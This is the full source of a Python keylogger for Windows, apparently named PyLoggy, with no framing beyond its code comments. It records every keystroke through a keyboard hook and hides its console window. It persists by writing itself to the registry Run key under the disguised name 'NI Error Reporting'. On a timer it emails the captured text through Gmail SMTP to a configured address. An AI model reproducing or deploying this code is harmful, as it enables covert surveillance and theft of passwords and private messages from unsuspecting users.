import sys,win32api,pythoncom
import pyHook,os,time,random,smtplib,string
import urllib
from _winreg import *

global t,yourgmail,yourgmailpass,sendto,interval,otpravka,start_time

#########Settings########
yourgmail="here your gmail"
yourgmailpass="here your password"
sendto="whom send the result"
interval=10
otpravka=600
t =""
start_time=time.time()
########################

def addStartup():  # this will add the file to the startup registry key
    fp = os.path.dirname(os.path.realpath('PyLoggy.exe'))
    file_name = sys.argv[0].split('\\')[-1]
    new_file_path = fp + '\\' + file_name
    keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
    key2change = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
    SetValueEx(key2change, 'NI Error Reporting.lnl', 0, REG_SZ,new_file_path)

def Hide():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

def Mail_it(data):
    data = 'Text:\n' + data
    server = smtplib.SMTP('smtp.gmail.com:587')
    server.starttls()
    server.login(yourgmail, yourgmailpass)
    server.sendmail(yourgmail, sendto, data)
    server.close()

def OnKeyboardEvent(event):
    global t,start_time
    if str(event.Key) == 'Back':
        data = '<-'                  #Backspace
    elif str(event.Key) == 'Oem_4':
        data = '{'
    elif str(event.Key) == 'Oem_6':
        data = '}'
    elif str(event.Key) == 'Oem_5':
        data = '|'
    elif str(event.Key) == 'Oem_1':
        data = ':'
    elif str(event.Key) == 'Oem_7':
        data = '"'
    elif str(event.Key) == 'Return':
        data = ' ' + 'Enter' + ' '
    elif str(event.Key) == 'Oem_Comma':
        data = ','
    elif str(event.Key) == 'Oem_Period':
        data = '.'
    elif str(event.Key) == 'Oem_2':
        data = '?'
    elif str(event.Key) == 'Oem_3':
        data = '~'
    elif str(event.Key) == 'Oem_Minus':
        data = '-'
    elif str(event.Key) == 'Oem_Plus':
        data = '+'
    elif str(event.Key) == 'Lcontrol':
        data = 'Ctrl(L)'
    elif str(event.Key) == 'Lmenu':
        data = 'Alt(L)'
    elif str(event.Key) == 'Lshift':
        data = 'Shift(L)'
    elif str(event.Key) == 'Capital':
        data = 'Caps Lock'
    elif str(event.Key) == 'Rmenu':
        data = 'Alt(R)'
    elif str(event.Key) == 'Rcontrol':
        data = 'Ctrl(R)'
    elif str(event.Key) == 'Rshift':
        data = 'Shift(R)'
    else:
        data = str(event.Key)
    t = t + data
    if int(time.time() - start_time) >= int(otpravka):
        Mail_it(t)
        start_time = time.time()
        t = ''
    return True

def Main():
    global t
    try:
     addStartup()
     Hide()
     urllib.urlopen("http://google.com")
     "Internet on"
     hook = pyHook.HookManager()
     hook.KeyDown = OnKeyboardEvent
     hook.HookKeyboard()
     pythoncom.PumpMessages()
    except IOError:
     time.sleep(interval)
     Main()
     "Internet off"

Main()